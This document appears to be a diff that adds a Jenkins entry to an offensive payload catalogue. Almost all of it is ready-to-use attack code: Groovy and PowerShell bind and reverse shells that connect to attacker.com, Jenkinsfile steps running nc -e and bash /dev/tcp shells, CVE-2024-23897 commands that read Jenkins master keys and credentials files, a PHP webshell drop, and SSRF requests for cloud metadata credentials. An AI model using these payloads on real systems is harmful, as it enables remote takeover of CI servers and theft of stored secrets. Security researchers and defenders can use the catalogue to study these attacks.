@@ -1,0 +1,320 @@
+---
+comment: "Jenkins exposes a Groovy Script Console at `/script` that executes arbitrary\
+  \ code inside the JVM\nrunning the Jenkins process. Access requires the `Overall/Administer`\
+  \ permission. The Groovy\nruntime directly invokes Java's `Runtime.getRuntime().exec()`,\
+  \ resulting in OS command execution\nas the user running Jenkins (commonly `jenkins`,\
+  \ `root`, or a service account).\n\nPipelines (Jenkinsfile) execute shell steps\
+  \ in a workspace on an agent node \u2014 useful when direct\nconsole access is unavailable\
+  \ but job creation or SCM push rights exist.\n\nCVE-2024-23897 (CVSS 9.8, CISA KEV\
+  \ \u2014 Jan 2024): Jenkins CLI uses the args4j library to parse\ncommand arguments.\
+  \ The `@` file-reference feature reads the contents of a file from the Jenkins\n\
+  controller filesystem and includes it as a CLI argument \u2014 exploitable without\
+  \ authentication\nwhen the CLI is enabled (default). Allows reading arbitrary files\
+  \ as the Jenkins process user,\nincluding secrets, credentials, and SSH keys.\n"
+functions:
+  bind-shell:
+  - code: |
+      ServerSocket server = new ServerSocket(12345)
+      Socket client = server.accept()
+      Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start()
+      InputStream ci = client.getInputStream()
+      OutputStream co = client.getOutputStream()
+      InputStream pi = p.getInputStream()
+      OutputStream po = p.getOutputStream()
+      while (!client.isClosed()) {
+          while (pi.available() > 0) co.write(pi.read())
+          while (ci.available() > 0) po.write(ci.read())
+          co.flush()
+          po.flush()
+          Thread.sleep(50)
+      }
+      p.destroy()
+      server.close()
+    comment: |
+      Opens a TCP server socket on port 12345 within the JVM and bridges it to `/bin/sh`.
+      The Script Console HTTP request hangs until the client disconnects. The Groovy loop
+      bridges stdin/stdout between the TCP client and the shell process.
+      Connect from the attacker with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      authenticated:
+      console:
+    platform: linux
+    tty: false
+  - code: |
+      ServerSocket server = new ServerSocket(12345)
+      Socket client = server.accept()
+      Process p = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start()
+      InputStream ci = client.getInputStream()
+      OutputStream co = client.getOutputStream()
+      InputStream pi = p.getInputStream()
+      OutputStream po = p.getOutputStream()
+      while (!client.isClosed()) {
+          while (pi.available() > 0) co.write(pi.read())
+          while (ci.available() > 0) po.write(ci.read())
+          co.flush()
+          po.flush()
+          Thread.sleep(50)
+      }
+      p.destroy()
+      server.close()
+    comment: "Windows variant \u2014 identical bridge logic but spawns `cmd.exe` instead\
+      \ of `/bin/sh`.\nThe Script Console HTTP request hangs until the client disconnects.\n\
+      Connect from the attacker with: nc victim.com 12345\n"
+    connector: tcp-client
+    contexts:
+      authenticated:
+      console:
+    platform: windows
+    tty: false
+  - code: |
+      pipeline {
+          agent any
+          stages {
+              stage('x') {
+                  steps {
+                      sh 'nc -lvp 12345 -e /bin/sh'
+                  }
+              }
+          }
+      }
+    comment: |
+      Opens a bind shell via a Jenkinsfile pipeline step on the agent node. Requires `nc`
+      with `-e` support (standard on most Linux agents). The job hangs while the shell is active.
+      Connect from the attacker with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      ci_cd:
+    platform: linux
+    tty: false
+  - code: |
+      pipeline {
+          agent any
+          stages {
+              stage('x') {
+                  steps {
+                      bat 'powershell -NoP -Exec Bypass -Command "$l=New-Object Net.Sockets.TcpListener 12345;$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();$b=New-Object byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$r=[Text.Encoding]::ASCII.GetBytes((iex ([Text.Encoding]::ASCII.GetString($b,0,$i)) |Out-String));$s.Write($r,0,$r.Length);$s.Flush()}"'
+                  }
+              }
+          }
+      }
+    comment: "Windows variant \u2014 opens a PowerShell TcpListener bind shell on\
+      \ the agent node via a\nJenkinsfile `bat` step. The job hangs while the shell\
+      \ is active.\nConnect from the attacker with: nc victim.com 12345\n"
+    connector: tcp-client
+    contexts:
+      ci_cd:
+    platform: windows
+    tty: false
+  file-read:
+  - code: |
+      # Download the Jenkins CLI jar (no auth required)
+      curl -s http://victim.com:8080/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar
+
+      # Read arbitrary files via the @ file-reference feature (unauthenticated)
+      java -jar jenkins-cli.jar -s http://victim.com:8080 help "@/etc/passwd"
+
+      # Read Jenkins master key (used to decrypt stored credentials)
+      java -jar jenkins-cli.jar -s http://victim.com:8080 help "@/var/lib/jenkins/secrets/master.key"
+
+      # Read hudson.util.Secret (AES key wrapping the credentials encryption)
+      java -jar jenkins-cli.jar -s http://victim.com:8080 help "@/var/lib/jenkins/secrets/hudson.util.Secret"
+
+      # Read stored credentials XML
+      java -jar jenkins-cli.jar -s http://victim.com:8080 help "@/var/lib/jenkins/credentials.xml"
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2024-23897:\
+      \ The Jenkins CLI arg parser passes `@<path>` arguments to FileInputStream,\n\
+      reading the referenced file from the controller's filesystem into the CLI response.\n\
+      The first line is reflected in error output; binary files read partially.\n\n\
+      For more complete multi-line reads use the `reload-configuration` command:\n\
+      \  java -jar jenkins-cli.jar -s http://victim.com:8080 reload-configuration\
+      \ \"@/etc/passwd\"\n\nDecrypt credentials after extracting master.key + hudson.util.Secret\
+      \ + credentials.xml:\n  python3 jenkins-credentials-decryptor  (github.com/hoto/jenkins-credentials-decryptor)\n\
+      \nRef: https://www.jenkins.io/security/advisory/2024-01-24/\nnuclei: CVE-2024-23897\n"
+    contexts:
+      unauthenticated:
+    version: |-
+      < 2.441 / LTS < 2.426.3
+  - code: |
+      println new File("/etc/passwd").text
+    comment: |
+      Reads an arbitrary file from the Jenkins controller's filesystem via the Script Console.
+      Useful for extracting credentials, SSH keys, or the Jenkins secrets directory
+      at /var/lib/jenkins/secrets/.
+    contexts:
+      authenticated:
+      console:
+  file-write:
+  - code: |
+      new File("/var/lib/jenkins/userContent/shell.php").text = '<?php system($_GET["c"]); ?>'
+    comment: |
+      Writes arbitrary content to a file on the Jenkins controller's filesystem via the Script
+      Console. The `userContent/` directory is served by Jenkins at /userContent/<file>, making
+      it a reliable webshell drop location without needing to know the webroot.
+      Access the shell at: http://victim.com:8080/userContent/shell.php?c=id
+    contexts:
+      authenticated:
+      console:
+  rce:
+  - code: |
+      def cmd = ["id"].execute()
+      cmd.waitFor()
+      println cmd.text
+    comment: |
+      Executes a command via Groovy's `.execute()` method and returns stdout. Works in the Script
+      Console under any credential with `Overall/Administer`. Use a List form for commands with
+      arguments to avoid shell-splitting issues:
+        ["ls", "-la", "/var/lib/jenkins/secrets"].execute()
+    contexts:
+      authenticated:
+      console:
+    platform: linux
+  - code: |
+      def cmd = ["cmd.exe", "/c", "whoami"].execute()
+      cmd.waitFor()
+      println cmd.text
+    comment: "Windows variant \u2014 uses `cmd.exe /c` instead of the Linux exec shorthand.\
+      \ Works in the\nScript Console under any credential with `Overall/Administer`.\
+      \ Use a List form for\ncommands with arguments: [\"cmd.exe\", \"/c\", \"dir\
+      \ C:\\\\Users\"].execute()\n"
+    contexts:
+      authenticated:
+      console:
+    platform: windows
+  - code: |
+      pipeline {
+          agent any
+          stages {
+              stage('x') {
+                  steps {
+                      sh 'id'
+                  }
+              }
+          }
+      }
+    comment: |
+      Executes a command as a shell build step in a declarative pipeline. Suitable when the
+      attacker can create or modify a Jenkins job or push a Jenkinsfile to a watched SCM branch.
+    contexts:
+      ci_cd:
+    platform: linux
+  - code: |
+      pipeline {
+          agent any
+          stages {
+              stage('x') {
+                  steps {
+                      bat 'whoami'
+                  }
+              }
+          }
+      }
+    comment: "Windows variant \u2014 uses `bat` instead of `sh` for Windows agent\
+      \ nodes. Suitable when the\nattacker can create or modify a Jenkins job or push\
+      \ a Jenkinsfile to a watched SCM branch.\n"
+    contexts:
+      ci_cd:
+    platform: windows
+  reverse-shell:
+  - blind: true
+    code: |
+      String host = "attacker.com"
+      int port = 12345
+      String cmd = "/bin/bash"
+      Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
+      Socket s = new Socket(host, port)
+      InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
+      OutputStream po = p.getOutputStream(), so = s.getOutputStream()
+      while (!s.isClosed()) {
+          while (pi.available() > 0) so.write(pi.read())
+          while (pe.available() > 0) so.write(pe.read())
+          while (si.available() > 0) po.write(si.read())
+          so.flush()
+          po.flush()
+          Thread.sleep(50)
+      }
+      p.destroy()
+      s.close()
+    comment: "Opens a raw TCP socket from within the JVM and bridges it to a spawned\
+      \ `/bin/bash` process.\nThe Script Console HTTP request hangs while the shell\
+      \ is active. Interaction happens via\nthe TCP socket to attacker.com:12345 \u2014\
+      \ the HTTP response does not reflect shell output.\nThe shell persists until\
+      \ the socket is closed or the Jenkins process restarts.\n"
+    contexts:
+      authenticated:
+      console:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  - blind: true
+    code: |
+      String host = "attacker.com"
+      int port = 12345
+      String ps = '$c=New-Object Net.Sockets.TCPClient("' + host + '",' + port + ');' +
+          '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};' +
+          'while(($i=$s.Read($b,0,$b.Length)) -ne 0){' +
+          '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);' +
+          '$sb=(iex $d 2>&1|Out-String);' +
+          '$r=[Text.Encoding]::ASCII.GetBytes($sb+"PS "+(pwd).Path+"> ");' +
+          '$s.Write($r,0,$r.Length);$s.Flush()}'
+      ["powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", ps].execute()
+    comment: "Windows variant \u2014 spawns a PowerShell interactive reverse shell\
+      \ from the Groovy Script\nConsole. PowerShell connects to attacker.com:12345\
+      \ and returns command output prefixed\nwith the current working directory prompt\
+      \ (PS C:\\...> ).\nThe Groovy execute() call is fire-and-forget; check the listener\
+      \ for the connection.\n"
+    contexts:
+      authenticated:
+      console:
+    listener: tcp-server
+    platform: windows
+    tty: false
+  - blind: true
+    code: |
+      pipeline {
+          agent any
+          stages {
+              stage('x') {
+                  steps {
+                      sh 'bash -i >& /dev/tcp/attacker.com/12345 0>&1'
+                  }
+              }
+          }
+      }
+    comment: |
+      Reverse shell via a Jenkinsfile pipeline step. Executed on the agent node, not the
+      Jenkins controller. Useful when only job creation or SCM write access is available.
+      The pipeline job log will show the step as running; the shell output goes to the
+      attacker's listener, not the build log.
+    contexts:
+      ci_cd:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  ssrf:
+  - code: |
+      // Probe any internal endpoint from the Jenkins controller via the Script Console
+      println new URL("http://169.254.169.254/latest/meta-data/iam/security-credentials/").text
+
+      // Fetch GCP metadata (requires the Metadata-Flavor header)
+      println new URL("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
+          .openConnection().with {
+              setRequestProperty("Metadata-Flavor", "Google")
+              inputStream.text
+          }
+
+      // Probe an internal service (e.g., unauthenticated Kubernetes API)
+      println new URL("http://10.0.0.1:8080/api/v1/namespaces").text
+    comment: "The Groovy Script Console executes arbitrary Java/Groovy code in the\
+      \ JVM, including\noutbound HTTP requests. `new URL(...).text` performs a synchronous\
+      \ GET and returns the\nfull response body \u2014 ideal for probing internal\
+      \ services or cloud metadata endpoints.\n\nThe request originates from the Jenkins\
+      \ controller host, which typically has access to:\n  - AWS IMDSv1: http://169.254.169.254/latest/meta-data/\n\
+      \  - GCP metadata: http://metadata.google.internal/computeMetadata/v1/\n  -\
+      \ Azure metadata: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\
+      \  - Internal Kubernetes API, databases, and microservices unreachable from\
+      \ the internet\n"
+    contexts:
+      authenticated:
+      console:
+...
